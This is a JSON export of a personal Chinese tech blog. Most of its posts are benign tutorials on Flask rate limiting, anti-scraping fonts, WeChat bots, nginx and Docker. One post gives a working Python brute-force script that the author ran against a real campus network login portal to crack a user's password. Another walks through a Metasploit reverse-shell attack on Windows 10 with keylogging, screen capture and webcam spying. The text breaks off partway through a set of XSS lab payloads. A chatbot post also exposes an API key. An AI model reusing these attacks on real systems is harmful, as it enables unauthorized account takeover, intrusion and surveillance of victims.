{"meta":{"title":"Welcome To Wangxt's Blog","subtitle":null,"description":null,"author":"WangXT","url":"https://wxt406611016.github.io"},"pages":[],"posts":[{"title":"flask+redis限制ip访问速率","slug":"flask+redis-限制ip访问频率","date":"2020-04-10T16:00:00.000Z","updated":"2020-09-20T08:36:21.915Z","comments":true,"path":"2020/04/11/flask+redis-限制ip访问频率/","link":"","permalink":"https://wxt406611016.github.io/2020/04/11/flask+redis-限制ip访问频率/","excerpt":"","text":"上篇介绍了利用font-face进行反爬虫，这篇介绍另一种常见方法–验证码校验，对频繁访问的ip进行限制，强制要求验证码验证，验证成功方可继续访问。 1.限制逻辑/策略： 利用request.remote_addr获取客户端ip； 客户端访问时，服务器判断redis中是否有客户端ip； 若不存在，将客户端ip存入redis中，对应值设为1；若存在，客户端ip对应值+1； 若redis中客户端ip对应值在5分钟内&gt;5，即5分钟内访问页面超过5次，则视为恶意ip，跳转至验证码校验页面； 验证成功后，向后端请求过渡函数B，进行redis操作，B函数的功能为将验证成功的ip从redis中删除，删除后再重定向至开始页面； 2.代码实现限制逻辑：后端代码如下，index()方法用于判断redis中是否存在客户端ip，以及ip对应值是否大于5：1234567891011@app.route(&apos;/&apos;, methods=[&apos;GET&apos;])def index(): ip=request.remote_addr if(rs.exists(ip)): #rs可操作redis rs.setrange(ip,0,int(rs.get(ip))+1) else: rs.set(ip,1,ex=300) #5分钟5次 if (int(rs.get(ip))&lt;6): return render_template(&apos;index.html&apos;) #正常返回 else: return render_template(&quot;antibot.html&quot;,ip=ip,secret=secret) #返回验证码校验页面 如果跳转至antibot.html(验证码校验页面)后，前端通过js对参数a进行base64加密，并带参数访问/mid页面，之所以要带参数，是为了在后端验证参数是否有效(即判断是否是通过验证码校验后跳转而来)：12345678910&lt;script&gt;......onSuccess: function() &#123; document.getElementById(&apos;msg&apos;).innerHTML = &apos;登录成功！&apos; var a=&quot;&#123;&#123;ip&#125;&#125;&quot;+&quot;&#123;&#123;secret&#125;&#125;&quot; //secret是从后端传来的随机密钥 a=window.btoa(a) //对变量a进行base64加密 window.location.href=&quot;/mid?id=&quot;+a &#125;,......&lt;/script&gt; mid()方法用于通过验证码校验后，将ip从redis中删除，并重定向至开始页面：1234567891011@app.route(&apos;/mid&apos;, methods=[&apos;GET&apos;])def mid(): cmp=request.args.get(&apos;id&apos;,&apos;0&apos;) ip=request.remote_addr sec=ip+secret #secret作为随机密钥进行加密 result=base64.b64encode(sec.encode()) result=str(result)[2:-1] if(cmp==result): #判断前端js传来的参数是否有效 rs.delete(ip) response = redirect(url_for(&apos;index&apos;)) return response 3.效果展示：打开flask项目，可以正常访问： 正常访问 刷新5次后，触发了限制ip策略，返回验证码校验界面： 返回验证码校验 验证成功后，成功返回开始页面。从而实现了flask上用redis进行限制ip访问频率。 PS:若设置反向代理需注意！！！如果设置了反向代理的话，request.remote_addr则不会返回客户端的真实ip。以nginx反向代理为例，客户想要访问服务器，实际请求路线是client-&gt;nginx-&gt;server，而request.remote_addr表示的是上一级ip，而server的上一级ip是nginx服务器的ip. 解决办法：以nginx为例，在配置文件中使用X-Forwarded-For，然后后端获取ip方式由 ip=request.remote_addr更改为ip = request.headers.getlist(&quot;X-Forwarded-For&quot;)[0] 即可。 访问上图中我的web项目，点击链接即可， 如有错误或建议，请在评论处指出！","categories":[],"tags":[]},{"title":"反爬虫策略之font-face","slug":"反爬虫策略之font-face","date":"2020-03-01T16:00:00.000Z","updated":"2020-09-20T08:37:09.404Z","comments":true,"path":"2020/03/02/反爬虫策略之font-face/","link":"","permalink":"https://wxt406611016.github.io/2020/03/02/反爬虫策略之font-face/","excerpt":"","text":"在互联网快速发展的时代里，爬虫可以说是无处不在。各类热搜以及热点新闻，时时刻刻都在被爬虫获取。如果开发者并不想让内容大范围传播呢？如何应对爬虫呢？常见的方法有验证码验证，以及对频繁登陆ip进行屏蔽，除此之外，还有一种通过font-face自定义字体的方式，可以让爬取到的内容和网页显示的内容完全不一样，从而产生一种是否爬错内容了的感觉。 1.font-face介绍：谈到font-face，也许很多人并不熟悉，但是说到应用此技术的公司，大家肯定都很熟悉了，58同城，猫眼电影等，都采用了font-face策略来应对爬虫。以58同城为例，打开审查元素，发现页面内的3室2厅1卫 和120㎡中的数字均变成了乱码 —-“驋室麣厅龒卫”,”龒麣龤㎡”。所以即便爬虫找到了正确位置，也依然无法获得正确信息。 58同城页面信息 2.font-face原理：仔细观察审查元素信息，在styles栏里发现了font-family，这就是自定义字体，可以把乱码显示成正常的数字。 审查元素 于是我们要找到font-family字样，右键点击网页源代码，搜索font-family，找到@font-face等关键字，通过分析data:application/font-ttf，可以猜测后面长串字符串应该是对某个ttf字体进行了base64编码。 查看网页源代码 上python，解码生成ttf字体文件。 12345678910from fontTools.ttLib import TTFontimport base64import iokey=&apos;&apos;&apos;AAEAAAALAIAAAwAwR1NVQiCLJXoAAAE.......AAAA #key值为源代码中的长串字符串&apos;&apos;&apos;data = base64.b64decode(key) #base64解码fonts = TTFont(io.BytesIO(data)) #生成二进制字节fonts.save(&apos;font-face.ttf&apos;) 将生成的font-face.ttf通过百度字体编辑器打开，可以看到对所有数字进行了重新编码。 自定义字体 是不是有点儿疑惑？怎么对数字重新编码？？？其实也可以理解为是对编码对应的图形进行了改变，比如同样是编码(0x9a4b)，在常规字体中是”驋”的模样可能在B字体中就是”2”的模样，在自己设计的字体里，可以任性的把(0x9a4b)编码对应的图形设计成”2”的形状，举个例子: 自定义字体有不一样的形状 同样是(0x9a4b)编码，在字体A中，你认为是2，在字体B中，即便和字体A中形状不一样，你一样认为是2，但在自定义字体中，你会认为是w。同样的道理，我们可以把常规字体中的乱码，设计成数字的形状。所以在自定义字体的基础上，我们可以变相认为对字体进行了加密，从而起到保护重要数据的作用。 3.实现font-face：理解了font-face的原理后，我们可以将font-face策略应用到自己的web项目中。为了简便操作，我直接用了第二步中在58同城网站下载的字体hhh(自行设计字体也很cool，想怎么画怎么画)。在前端html文件中加入以下内容:123456789&lt;style&gt;@font-face&#123;font-family:&apos;secret&apos;;src:url(&apos;data:application/font-ttf;charset=utf-8;base64,AAEAAAALAIAAAwAwR1NVQiCLJXoA.......AAAAAAAAA&apos;)format(&apos;truetype&apos;)&#125;.strongbox&#123;font-family:&apos;fangchan-secret&apos;,&apos;Hiragino Sans GB&apos;,&apos;Microsoft yahei&apos;,Arial,sans-serif,&apos;宋体&apos;!important&#125;&lt;/style&gt;&lt;style&gt;.font&#123;font-family:&apos;secret&apos;,&apos;Hiragino Sans GB&apos;,&apos;Microsoft yahei&apos;,Arial,sans-serif,&apos;\\5B8B\\4F53&apos; !important&#125;&lt;/style&gt; 上面一段的作用为引入名叫”secret”的自定义字体,然后通过style设计.font，使所有class为”font”的标签应用此自定义字体。换言之，当你想用自定义字体时，在相应的标签中加入class=”font”，如下html源码和前端显示结果: html源码 前端显示结果 可见2020 04-27日期字样在源码中显示为乱码。访问上图中我的web项目，点击链接即可，(暂时只对页面右侧一栏中的日期做了font-face加密。) 如有错误或建议，请在评论处指出！","categories":[],"tags":[]},{"title":"python+微信+腾讯智能闲聊","slug":"python实现微信调用腾讯智能闲聊","date":"2020-02-07T16:00:00.000Z","updated":"2020-09-20T08:37:41.728Z","comments":true,"path":"2020/02/08/python实现微信调用腾讯智能闲聊/","link":"","permalink":"https://wxt406611016.github.io/2020/02/08/python实现微信调用腾讯智能闲聊/","excerpt":"","text":"继上一篇调用图灵机器人的玩法后，不满于每天100条的限额，于是！！！又找到了腾讯云产品-智能闲聊，免费！无限额！申请智能闲聊 1.构建调用api文件：由于wxpy库没有集成腾讯智能闲聊的api，我们需要自己配置接口，所以会比调用图灵机器人显得麻烦。上python，下面是api.py的内容，主要用于向腾讯云发送请求，并获取回复内容，相当于一个调用api。如下api.py:1234567891011121314151617181920212223242526272829303132333435363738394041###api.py###import hashlibimport timeimport requestsimport randomimport stringfrom urllib.parse import quote def curlmd5(src): m = hashlib.md5(src.encode(&apos;UTF-8&apos;)) return m.hexdigest().upper() # 将得到的MD5值所有字符转换成大写 def get_params(plus_item): #用于返回request需要的data内容 global params t = time.time() #请求时间戳（秒级）,（保证签名5分钟有效） time_stamp=str(int(t)) nonce_str = &apos;&apos;.join(random.sample(string.ascii_letters + string.digits, 10)) # 请求随机字符串，用于保证签名不可预测 app_id=&apos;2135462408&apos; # 修改成自己的id app_key=&apos;w3Lv6zsb95T89fay&apos; # 修改成自己的key params = &#123;&apos;app_id&apos;:app_id, &apos;question&apos;:plus_item, &apos;time_stamp&apos;:time_stamp, &apos;nonce_str&apos;:nonce_str, &apos;session&apos;:&apos;10000&apos; &#125; sign_before = &apos;&apos; for key in sorted(params): #要对key排序再拼接 sign_before += &apos;&#123;&#125;=&#123;&#125;&amp;&apos;.format(key,quote(params[key], safe=&apos;&apos;)) # 拼接过程需要使用quote函数形成URL编码 sign_before += &apos;app_key=&#123;&#125;&apos;.format(app_key) # 将app_key拼接到sign_before后 sign = curlmd5(sign_before) params[&apos;sign&apos;] = sign # 对sign_before进行MD5运算 return params #得到request需要的data内容 def get_content(plus_item): global payload,r url = &quot;https://api.ai.qq.com/fcgi-bin/nlp/nlp_textchat&quot; # 聊天的API地址 plus_item = plus_item.encode(&apos;utf-8&apos;) payload = get_params(plus_item) r = requests.post(url,data=payload) #带参请求api地址 result=r.json()[&quot;data&quot;][&quot;answer&quot;] return result #获得返回内容 2.与智能闲聊进行聊天终于将前提基础工作完成了，调用api构建好后，调用智能闲聊也就很简单了，调用wxpy库，初始化和构建自动发送、回复函数和上一章都一样。为了简化工作，本例中只实现自动回复功能，也是最常用的功能。依然上ai.py的代码，用于聊天。ai.py如下：1234567891011121314151617181920from wxpy import *from ai import * #导入上一步构建的ai.py文件bot = Bot()friend = bot.friends().search(&apos;AIbot&apos;)[0]@bot.register(friend)def auto_reply(msg): a=msg.text answer=get_content(a) if answer==&apos;&apos;: #防止返回内容为空 for i in range(2): time.sleep(2) answer=get_content(a) if answer!=&apos;&apos; and answer!=&quot;emmmm，我不是很懂你的意思&quot;: break else: answer=&quot;emmmm，我不是很懂你的意思&quot; return &apos;[Stephen] &#123;&#125; &apos;.format(answer)bot.join() 由于访问腾讯api的时候，偶尔会返回空内容，为了避免这种情况，当返回空时，隔2s再请求一次，这般重复3次，如果依然返回空，则自动将返回值设为”emmmm，我不是很懂你的意思”。 3.效果展示：ps：我已将智能闲聊的名字设为了”Stephen”，上图最重要： 和智能闲聊增进感情 腾讯智能闲聊的智能化程度也挺高，日常闲聊也没有太大问题，有些回答甚至比图灵机器人还要讨喜，各有千秋吧。最关键的是免费！不限额！尽管wxpy功能很强大，但是部分用户无法登陆微信网页版，也就无法体验wxpy的服务了，可以说是很可惜了！ 如有错误或建议，请在评论处指出！","categories":[],"tags":[]},{"title":"python实现微信自动回复+图灵机器人","slug":"python实现微信自动回复+图灵机器人","date":"2020-01-11T16:00:00.000Z","updated":"2020-09-20T08:38:04.664Z","comments":true,"path":"2020/01/12/python实现微信自动回复+图灵机器人/","link":"","permalink":"https://wxt406611016.github.io/2020/01/12/python实现微信自动回复+图灵机器人/","excerpt":"","text":"前段时间无意间看到wxpy，彷佛捡到了宝，立马开始探索用python玩微信，可以将很多操作自动化，既方便又有趣。wxpy是 在 itchat 的基础上，通过大量接口优化提升了模块的易用性，并进行丰富的功能扩展，其中就包括平时常用的自动回复，主动发消息，甚至还能引入智能聊天机器人。话不多说，上python！更多玩法关注wxpy官方文档 1.初始化：1234from wxpy import * # 导入模块bot = Bot() # 初始化机器人，扫码登陆 friend = bot.friends().search(&apos;AIbot&apos;)[0] #搜索昵称为&quot;AIbot&quot;的好友group = bot.groups().search(&apos;test&apos;)[0] #搜索名称为&quot;test&quot;的群聊 2.自动发送、回复指定消息：自动发送消息：12friend.send(&apos;for test&apos;) #自动向&quot;AIbot&quot;好友发送消息group.send(&apos;for test&apos;) #自动向&quot;test&quot;群组发送消息 自动回复消息：12345678910@bot.register(friend) # 回复 friend 的消息def reply_my_friend(msg): return &apos;received: &#123;&#125;)&apos;.format(msg.text) # 回复消息内容@bot.register([friend,Group]) #自动回复所有好友和群聊def auto_reply(msg): if isinstance(msg.chat, Group) and not msg.is_at: return #如果是群聊，但没有被 @，则不回复 else: return &apos;收到消息: &#123;&#125;&apos;.format(msg.text) # 回复消息内容 3.引入图灵机器人：引入智能聊天机器人，才是python玩微信的精髓hhh。wxpy库目前提供了两种自动聊天机器人接口，图灵机器人和小i机器人，本文中选择受众度更高的图灵机器人。调用图灵机器人需要申请api-key，申请点击链接即可！ 下面给出图灵机器人自动回复好友”AIbot”消息的全代码： 12345678910from wxpy import *bot = Bot()friend = bot.friends().search(&apos;AIbot&apos;)[0]tuling = Tuling(api_key=&apos;4e2xxxxxxxa8&apos;) #api_key为你申请的api_key@bot.register(friend)def reply_my_friend(msg): tuling.do_reply(msg) #图灵机器人自动回复bot.join() #保持登陆状态 话不多说，上图，日常基本聊天还是可以的： 和图灵机器人的聊天 图灵机器人的智能化程度还是很高的，日常聊天都很ok。但是虽然是免费的，但是有限制次数，认证后一天100条。总的来说日常简短的聊天还是不错的选择。 如有错误或建议，请在评论处指出！","categories":[],"tags":[]},{"title":"linux配置nginx反向代理","slug":"linux配置nginx反向代理","date":"2019-12-25T16:00:00.000Z","updated":"2020-09-20T08:38:38.976Z","comments":true,"path":"2019/12/26/linux配置nginx反向代理/","link":"","permalink":"https://wxt406611016.github.io/2019/12/26/linux配置nginx反向代理/","excerpt":"","text":"将web项目部署到服务器之后，通过nginx反向代理可以帮助隐藏web项目所在的端口号，避免了端口暴露在外的风险，本文主要讲述反向代理的概念和在linux环境下如何配置nginx反向代理。 1.什么是反向代理？反向代理（Reverse Proxy）方式:是指以代理服务器来接受Internet上的连接请求，然后将请求转发给内部网络上的服务器；并将从服务器上得到的结果返回给Internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。通常的代理服务器，只用于代理内部网络对Internet的连接请求，客户机必须指定代理服务器,并将本来要直接发送到Web服务器上的http请求发送到代理服务器中。当一个代理服务器能够代理外部网络上的主机，访问内部网络时，这种代理服务的方式称为反向代理服务。简单来讲，正向代理是作为客户端的代理服务器，反向代理则是作为服务器端的代理服务器。 nginx反向代理 2.安装nginx服务器安装步骤非常简单，打开终端，输入：sudo apt-get install nginx 在终端输入以下内容，打开nginx服务器：service nginx start 3.配置nginx服务器apt-get安装下的nginx配置文件的位置在 /etc/nginx/sites-available/default，打开default文件，并将proxy_pass处的值，改为你想要代理的服务器端口地址。(下图中代理的为5000端口号）123456789101112server &#123; listen 80; server_name localhost; location / &#123; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass &quot;http://127.0.0.1:5000/&quot;; &#125; &#125; 接下来要将配置信息重新载入，终端输入：/etc/init.d/nginx reload 4.测试结果打开一个本地web项目，开放在5000端口 打开一个flask项目，并开放在5000端口 在浏览器中输入url：0.0.0.0或0.0.0.0:80（因为nginx默认开放80端口，并且可以省略端口号） 访问nginx端口号，并成功返回flask项目内容 可以看到，浏览器显示的内容正是开放在5000端口的flask项目。 如有错误或建议，请在评论处指出！","categories":[],"tags":[]},{"title":"python脚本-暴力破解无线网弱密码","slug":"python脚本-暴力破解无线网弱密码","date":"2019-04-25T16:00:00.000Z","updated":"2020-09-20T08:39:09.213Z","comments":true,"path":"2019/04/26/python脚本-暴力破解无线网弱密码/","link":"","permalink":"https://wxt406611016.github.io/2019/04/26/python脚本-暴力破解无线网弱密码/","excerpt":"","text":"背景：学校最近重新架设无线网一体化，而初始密码为弱密码（6位数字），下面我们要做的就是通过暴力破解的方式破解弱密码！（所以建议大家以后无论是在注册还是什么情况，都千万不要使用弱密钥）攻击过程如下： 1.获取get参数在爆破之前我们需要获取一些get参数，这些参数应该包含着我们输入的登陆信息。 登陆无线网前需要在网页上进行身份验证。 验证界面 随便输入一个账号密码，看返回结果是什么。比如输入学号：1122，密码：1231131，运营商选择联通。提示无账号，但是无所谓，毕竟我们的目的在于接下来的抓包环节。抓包看看get的网址，选择我们有用的，比如下图中get参数中包含了我们输入的信息。这很有用，因为这为我们下面的python脚本提供了url。 获取输入的get参数 看一下回显结果，提示&quot;result&quot;:&quot;0&quot;等信息。 验证失败回显内容 我们再输入一个正确的账号密码，将get参数中的user_account和user_password换成正确的（我自己的无线网认证账号密码，账号和密码就不公布了hhhhh），看一下正确登陆后的回显内容。显示&quot;result&quot;:&quot;1&quot;,&quot;认证成功&quot;等信息。 验证正确回显内容 ok，我们可以根据回显内容的不同来判断是否验证成功。下面就可以进行暴力破解了，只需要选定一个存在的账号，然后穷举6位数字密码的所有可能性，一一验证即可。 python脚本暴力破解直接上代码吧： 123456789101112131415161718192021222324252627282930313233from time import strftimefrom itertools import productfrom time import sleepimport requestsfrom requests import postimport reimport threading #可开启多线程import time def fx(iter=[&apos;0123456789&apos;]): def psgen(x): #密码生成器，穷举所有的密码可能性，参数x表示密码长度 for r in iter: for repeat in range(x,x+1): for ps in product(r,repeat=repeat): yield &apos;&apos;.join(ps) for ps in psgen(6): url=&apos;http://10.2.5.251:801/eportal/?c=Portal&amp;a=login&amp;callback=dr1556270398016&amp;login_method=1&amp;user_account=08xxxx05@unicom&amp;user_password=%s&amp;wlan_user_ip=10.3.37.27&amp;wlan_user_mac=d07e351e9bbe&amp;wlan_ac_ip=&amp;wlan_ac_name=NAS&amp;jsVersion=3.0&amp;_=1556270388759&apos;%ps try: s=requests.session() rs=s.get(url).content.decode(&apos;utf-8&apos;) r = re.findall(r&apos;认证成功&apos;,rs) #判断验证结果 if r: with open(&quot;resut.csv&quot;,&quot;a+&quot;) as f: #存储密码结果到result.csv文件中 f.write(&apos;密码破解成功结果为：,&apos;+ ps + &apos;,&apos; + strftime(&quot;%c&quot;) + &apos;,&apos; + url+&apos;\\n&apos;) print(&apos;密码破解成功：&apos;+ps+&apos; ,&apos;+rs) break else: print(ps+&apos;密码不正确&apos;+rs) except: sleep(1) pass fx([&apos;0123456789&apos;]) 接下来运行等待结果就ok了。看一下运行过程图： 暴力破解过程图 由于一共的可能性有1000000种，而且每一次穷举都要进行一次网络验证，即每一次验证都有网络延时，所以要等上一会儿。大概爆破了一个多小时，终于爆出了正确结果。生成了result.csv文件，查看一下文件内容，如下所示：1密码破解成功结果为：,15xxxx,Fri Apr 26 17:28:19 2019,http://10.2.5.251:801/eportal/?c=Portal&amp;a=login&amp;callback=dr1556270398016&amp;login_method=1&amp;user_account=08xxxx05@unicom&amp;user_password=15xxxx&amp;wlan_user_ip=10.3.37.27&amp;wlan_user_mac=d07e351e9bbe&amp;wlan_ac_ip=&amp;wlan_ac_name=NAS&amp;jsVersion=3.0&amp;_=1556270388759 速度慢可以开启多线程，同时进行测试。结果好很多！ 爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！","categories":[],"tags":[]},{"title":"利用docker将web项目部署到服务器","slug":"利用docker将web项目部署到服务器","date":"2019-03-30T16:00:00.000Z","updated":"2020-09-20T08:39:35.829Z","comments":true,"path":"2019/03/31/利用docker将web项目部署到服务器/","link":"","permalink":"https://wxt406611016.github.io/2019/03/31/利用docker将web项目部署到服务器/","excerpt":"","text":"完成了一个简单的web项目，想部署到云服务器，利用docker是一个很好的办法 创建docker容器在当前web项目目录下创建Dockerfile和requirements.txt两个文件。文件填写内容根据你的web项目来定，具体参考官网教程。～～docker官网～～ 我的目录结构 接下来创建docker镜像，打开终端，输入docker image build -t name .name为你创建的镜像名字，自定义，注意不要漏了name后的那个“.”然后输入docker image ls 在这里插入图片描述 显示已存在的docker镜像，cumt是我的web项目，下面我要将cumt这个镜像部署到我的阿里云服务器。 生成静态文件将docker镜像导出为静态文件docker save cumt:latest &gt; cumt.tar cumt:latest为镜像名, cumt.tar为新生成的静态文件名。 部署到云服务器使用scp将静态文件上传到服务器端scp ./cumt.tar root@47.106.130.6:/cumt.tar 使用ssh登陆你的云服务器ssh root@47.106.130.6 输入ls查看是否上传成功ls 如果ls下没有找到你上传的静态文件，使用find命令查找它。find / -name cumt.tar 还原静态文件在静态文件所在位置目录下运行docker load命令还原。docker load &lt; cumt.tar输入docker image ls发现，已还原为镜像文件。 cumt镜像已还原 大功告成，可以直接运行了，如果不需要连接数据库的话直接输入docker run -p 4000:5000 cumt如果需要连接数据库，则需要用link方法挂载数据库（前提是你已经有数据库镜像）docker run --link your-mysql -p 4000:5000 cumt访问服务器公网的4000端口就可以访问你的web项目了。注意要在控制台打开服务器的4000端口（映射端口号可以自定义） 小结:利用静态文件进行容器的迁移, 是一件非常简单的事情, 你可以像发布一个软件包一样将自己的docker容器生成的静态文件分发到各类操作系统, docker才是真正的跨平台呀!","categories":[],"tags":[]},{"title":"利用msf攻击win10","slug":"利用msf攻击win10","date":"2019-03-29T16:00:00.000Z","updated":"2020-09-20T08:40:16.669Z","comments":true,"path":"2019/03/30/利用msf攻击win10/","link":"","permalink":"https://wxt406611016.github.io/2019/03/30/利用msf攻击win10/","excerpt":"","text":"攻击环境：攻击者系统：虚拟机下kali linux靶机系统：win10（需要打开Easy File Sharing服务）攻击者ip：10.3.134.27靶机ip：10.3.37.56攻击者和靶机在同一个wifi下，保证在同一网段里，能互相ping通。漏洞利用：EsayFileSharing 注意点： 攻击者的虚拟机网络模式应选择桥接模式。 准备工作完成，可以开始内网渗透之旅了。 step-1首先我们先用nmap扫描一下靶机开了哪些服务root@kali:~# nmap -sV 10.3.37.56 namp扫描结果 我们可以看到80端口和443端口开放了，对应的是Easy File Sharing Web Server，满足EasyFileSharing漏洞攻击，进入下一步。 step-2打开msf控制台，设置攻击参数 12root@kali:~# msfconsole #进入控制台，稍微等一下msf &gt; search EasyFileSharing #查找我们要用的漏洞 搜索结果 我们选择最新的一个，2017-06-12的版本，并设置payload。 12msf &gt; use exploit/windows/http/easyfilesharing_post #使用这个漏洞msf exploit(windows/http/easyfilesharing_post) &gt; set payload windows/meterpreter/reverse_tcp #设置攻击payload 我们用show options看一下需要什么攻击参数 1msf exploit(windows/http/easyfilesharing_post) &gt; show options 设置参数 根据Required属性看一下哪些是需要配置的，其中一些是配置好的，我们只需将其他的配置好就ok了。12msf exploit(windows/http/easyfilesharing_post) &gt; set lhost 10.3.134.27 #设置本地ipmsf exploit(windows/http/easyfilesharing_post) &gt; set rhost 10.3.37.56 #设置远程ip 参数都配置好了，接着就是激动人心的exploit了。 1msf exploit(windows/http/easyfilesharing_post) &gt; exploit #攻击 显示这个页面，说明你成功了 逐个输入以下命令，试试 12345678meterpreter &gt; getuid #获取靶机uidmeterpreter &gt; shell #进入靶机shellmeterpreter &gt; screenshot #靶机截屏meterpreter &gt; webcam_snap #用靶机摄像头拍照meterpreter &gt; webcam_stream #用靶机摄像头录像meterpreter &gt; keyscan_start #开启键盘记录meterpreter &gt; keyscan_dump #捕获键盘记录meterpreter &gt; keyscan_stop #停止键盘记录 我们来测试几个好玩的1st.捕捉靶机键盘记录 捕捉到靶机键盘记录（hack hack） 2nd.捕捉靶机截屏 捕捉靶机截屏 捕捉靶机截屏 3rd.用靶机摄像头拍照 利用靶机摄像头拍照 靶机摄像头像素略渣，不过看看我们的公教区学习环境吧 小结：我们做攻击实验都是在环境都配置好的情况下，现实生活中不会有这么好的肉鸡。而且网络攻击属于违法行为，人生路漫漫，且行且珍惜hhhhh","categories":[],"tags":[]},{"title":"xss(1~10)","slug":"xss(1~10)","date":"2019-03-07T16:00:00.000Z","updated":"2020-09-20T08:40:47.993Z","comments":true,"path":"2019/03/08/xss(1~10)/","link":"","permalink":"https://wxt406611016.github.io/2019/03/08/xss(1~10)/","excerpt":"","text":"xss闯关入口 less-1查看源代码， 123$str = $_GET[&quot;name&quot;];echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;?&gt; 并没有过滤，payload:name=&lt;script&gt;alert(1)&lt;/script&gt; less-2查看源代码，12345$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str.&apos;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt; 有两处输出，第一处在echo处，但被做了转义处理，起到过滤效果，第二处在input处，没有过滤，所以选择在表单的input里攻击,注意语句闭合方式为 “ ，payload:&quot; onclick=&quot;alert(1) less-3查看源代码，12345$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;&lt;input type=submit name=submit value=搜索 /&gt; 两处输出位置都做了转义处理，都被过滤了，所以 “，&lt;，&gt;符号（双引号和尖括号）就没有效果了，但是源码里input里的value的闭合方式为 ‘，所以还是可以攻击的。payload:&#39; onclick=&#39;alert(1) less-4查看源代码，1234567$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt; 两处输出位置，一处被转义了，input处没被转义，但是被做了函数处理，尖括号被替换为了空，和less-3的套路一样。payload:&quot; onclick=&quot;alert(1) less-5查看源代码， 1234567$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt; 有两处输出，一处被做了转义处理，input处输入被做了小写和on，&lt;script被做了替换处理，payload:&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt; less-6查看源代码，123456789$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt; 有两处输出，一处被做了转义处理，input处&lt;script,on,src,data,href被做了替换处理，但是没有做less-5中的小写处理，所以可以通过大写替换字绕过，payload:&quot; ONclick=&quot;alert(1) less-7查看源代码，123456789$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt; 有两处输出，一处被做了转义处理，input处做了小写处理和script,on,src,data,href被做了替换处理，可以利用双写来拼合成，例如oonn被处理后就变为了on，payload:&quot; oonnclick=&quot;alert(1) less-8查看源代码，123456789101112$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);……&lt;input name=keyword value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt; echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;?&gt; 有两处输出，一处input做了转义处理，另一处做了小写处理和script,on,src,data,href，” ，被做了替换处理，这题的关键在友情链接处,点击”添加友情链接”后会在友情链接出加入一个拼接的语句。t的ASCII码116用表示为”&amp;#116”，同理:表示为”&amp;#58”，payload:javascrip&amp;#116:alert(1) less-9查看源代码，1234567891011121314151617181920$str = 